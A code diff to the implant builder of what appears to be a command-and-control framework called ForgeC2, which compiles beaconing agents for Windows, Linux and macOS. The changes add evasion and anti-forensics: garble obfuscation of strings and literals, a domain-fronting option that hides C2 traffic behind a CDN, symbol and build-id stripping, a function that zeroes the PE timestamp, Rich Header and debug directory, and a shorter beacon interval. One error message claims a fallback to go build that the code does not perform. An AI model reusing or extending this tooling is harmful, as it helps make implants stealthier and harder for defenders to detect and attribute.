@@ -154,7 +154,7 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 
 	if UsesManualProfileSettings(cfg.Profile) {
 		if cfg.Interval < 0 {
-			cfg.Interval = 10
+			cfg.Interval = 5
 		}
 		if cfg.Jitter == 0 {
 			cfg.Jitter = 20
@@ -172,7 +172,7 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	if profile.Sleep > 0 {
 		cfg.Interval = profile.Sleep
 	} else if cfg.Interval == 0 {
-		cfg.Interval = 10
+		cfg.Interval = 5
 	}
 	cfg.Jitter = profile.Jitter
 	if profile.UserAgent != "" {
@@ -296,6 +296,25 @@ type ImplantConfig struct {
 	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
 	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
 	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
+	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
+	DomainFront   string // CDN front domain for domain fronting ("" = disabled)
+}
+
+// forgeC2ModuleReplace returns a `replace` directive for the local
+// github.com/forgec2/forgec2 module, so the temp agent build can
+// find it without requiring a remote git repository.
+func forgeC2ModuleReplace() string {
+	// Try to find the module root from the current working directory
+	// (the server is always launched from the project root).
+	wd, err := os.Getwd()
+	if err != nil {
+		return ""
+	}
+	// Verify go.mod exists
+	if _, err := os.Stat(filepath.Join(wd, "go.mod")); err != nil {
+		return ""
+	}
+	return "\nreplace github.com/forgec2/forgec2 => " + wd + "\n"
 }
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
@@ -323,6 +342,7 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	}
 
 	// go.mod with required external dependencies
+	replaceDir := forgeC2ModuleReplace()
 	goMod := `module agent
 
 go 1.25
@@ -332,7 +352,7 @@ require (
 	golang.org/x/sys v0.42.0
 	modernc.org/sqlite v1.52.0
 )
-`
+` + replaceDir
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
@@ -374,7 +394,7 @@ require (
 		evasion = "true"
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s"`,
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -394,6 +414,7 @@ require (
 		escape(cfg.CryptoKey),
 		escape(cfg.ExpiryDate),
 		evasion,
+		escape(cfg.DomainFront),
 	)
 
 	// Output filename
@@ -431,23 +452,13 @@ require (
 	}
 
 	// Build command - use explicit GOOS/GOARCH
-	cmd := exec.Command(goCmd, "build",
-		"-ldflags", ldflags,
-		"-o", outPath,
-		"-trimpath",
-		".",
-	)
-	cmd.Dir = tmpDir
-	cmd.Env = append(os.Environ(),
-		"GOOS=windows",
-		"GOARCH=amd64",
-		"CGO_ENABLED=0",
-	)
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", "amd64"); err != nil {
+		return "", err
+	}
 
-	var stderr bytes.Buffer
-	cmd.Stderr = &stderr
-	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("go build failed: %w\n%s", err, stderr.String())
+	// Post-build: strip PE forensic artifacts
+	if !cfg.Obfuscate {
+		stripPEArtifacts(outPath)
 	}
 
 	if _, err := os.Stat(outPath); err != nil {
@@ -531,6 +542,93 @@ func extractAgentSources(efs embed.FS, dir string) error {
 	return nil
 }
 
+// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
+func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
+	buildArgs := []string{"build"}
+	if obfuscate {
+		// Try garble first
+		if garblePath, err := exec.LookPath("garble"); err == nil {
+			garbleArgs := append([]string{"-literals", "-tiny", "-seed=random", "build"}, buildArgs[1:]...)
+			cmd := exec.Command(garblePath, append(garbleArgs, "-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")...)
+			cmd.Dir = workDir
+			cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+			var stderr bytes.Buffer
+			cmd.Stderr = &stderr
+			if err := cmd.Run(); err != nil {
+				return fmt.Errorf("garble build failed (falling back to go build): %w\n%s", err, stderr.String())
+			}
+			return nil
+		}
+		// garble not found, fall through to regular build with extra flags
+	}
+	cmd := exec.Command(goCmd, append(buildArgs,
+		"-ldflags", ldflags,
+		"-o", outPath,
+		"-trimpath",
+		"-buildvcs=false",
+		".",
+	)...)
+	cmd.Dir = workDir
+	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+	var stderr bytes.Buffer
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		return fmt.Errorf("go build failed: %w\n%s", err, stderr.String())
+	}
+	return nil
+}
+
+// stripPEArtifacts removes forensic PE artifacts: timestamp, Rich Header, Debug Directory.
+func stripPEArtifacts(path string) {
+	data, err := os.ReadFile(path)
+	if err != nil || len(data) < 0x100 {
+		return
+	}
+	if data[0] != 'M' || data[1] != 'Z' {
+		return // not a PE file
+	}
+	peOffset := int(data[0x3C]) | int(data[0x3D])<<8
+	if peOffset+4 >= len(data) {
+		return
+	}
+
+	// 1. Zero timestamp at PE+8
+	tsOffset := peOffset + 8
+	if tsOffset+4 <= len(data) {
+		for i := range 4 {
+			data[tsOffset+i] = 0
+		}
+	}
+
+	// 2. Zero Rich Header (between DOS stub and PE signature)
+	// Rich Header starts after DOS header+e_lfanew, ends at PE signature.
+	// Search backwards from PE signature for "Rich" magic.
+	richStart := 0
+	for i := peOffset - 4; i >= 0x80; i-- {
+		if data[i] == 'R' && data[i+1] == 'i' && data[i+2] == 'c' && data[i+3] == 'h' {
+			richStart = i
+			break
+		}
+	}
+	if richStart > 0 {
+		// Zero from Rich marker to PE signature
+		for i := richStart; i < peOffset; i++ {
+			data[i] = 0
+		}
+	}
+
+	// 3. Clear Debug Directory entry in data directory
+	// Data directory index 6 = IMAGE_DIRECTORY_ENTRY_DEBUG
+	debugDirOffset := peOffset + 0x70 + 6*8 // 0x70 = offset of data directory in PE64
+	if debugDirOffset+8 <= len(data) {
+		for i := range 8 {
+			data[debugDirOffset+i] = 0
+		}
+	}
+
+	os.WriteFile(path, data, 0644)
+}
+
 // GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
 func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
@@ -555,6 +653,7 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
+	replaceDir := forgeC2ModuleReplace()
 	goMod := `module agent
 
 go 1.25
@@ -563,7 +662,7 @@ require (
 	golang.org/x/net v0.42.0
 	golang.org/x/sys v0.42.0
 )
-`
+` + replaceDir
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
 	}
@@ -596,7 +695,12 @@ require (
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
+	evasion := "false"
+	if cfg.Evasion {
+		evasion = "true"
+	}
+
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -615,6 +719,8 @@ require (
 		escape(cfg.Proxy),
 		escape(cfg.CryptoKey),
 		escape(cfg.ExpiryDate),
+		evasion,
+		escape(cfg.DomainFront),
 	)
 
 	outName := cfg.Filename
@@ -640,23 +746,8 @@ require (
 	if err != nil {
 		return "", err
 	}
-	cmd := exec.Command(goCmd, "build",
-		"-ldflags", ldflags,
-		"-o", outPath,
-		"-trimpath",
-		".",
-	)
-	cmd.Dir = tmpDir
-	cmd.Env = append(os.Environ(),
-		"GOOS=linux",
-		"GOARCH=amd64",
-		"CGO_ENABLED=0",
-	)
-
-	var stderr bytes.Buffer
-	cmd.Stderr = &stderr
-	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("go build (linux) failed: %w\n%s", err, stderr.String())
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", "amd64"); err != nil {
+		return "", err
 	}
 
 	if _, err := os.Stat(outPath); err != nil {
@@ -690,6 +781,7 @@ func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
+	replaceDir := forgeC2ModuleReplace()
 	goMod := `module agent
 
 go 1.25
@@ -698,7 +790,7 @@ require (
 	golang.org/x/net v0.42.0
 	golang.org/x/sys v0.42.0
 )
-`
+` + replaceDir
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
 	}
@@ -731,7 +823,12 @@ require (
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
+	evasion := "false"
+	if cfg.Evasion {
+		evasion = "true"
+	}
+
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -750,15 +847,13 @@ require (
 		escape(cfg.Proxy),
 		escape(cfg.CryptoKey),
 		escape(cfg.ExpiryDate),
+		evasion,
+		escape(cfg.DomainFront),
 	)
 
 	outName := cfg.Filename
 	if outName == "" {
 		outName = "forgec2_agent"
-	}
-	// macOS binaries typically have no extension
-	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
-		outName = outName[:len(outName)-4]
 	}
 	outPath := filepath.Join(outputDir, outName)
 	if !filepath.IsAbs(outPath) {
@@ -775,23 +870,8 @@ require (
 	if err != nil {
 		return "", err
 	}
-	cmd := exec.Command(goCmd, "build",
-		"-ldflags", ldflags,
-		"-o", outPath,
-		"-trimpath",
-		".",
-	)
-	cmd.Dir = tmpDir
-	cmd.Env = append(os.Environ(),
-		"GOOS=darwin",
-		"GOARCH=amd64",
-		"CGO_ENABLED=0",
-	)
-
-	var stderr bytes.Buffer
-	cmd.Stderr = &stderr
-	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("go build (macos) failed: %w\n%s", err, stderr.String())
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", "amd64"); err != nil {
+		return "", err
 	}
 
 	if _, err := os.Stat(outPath); err != nil {
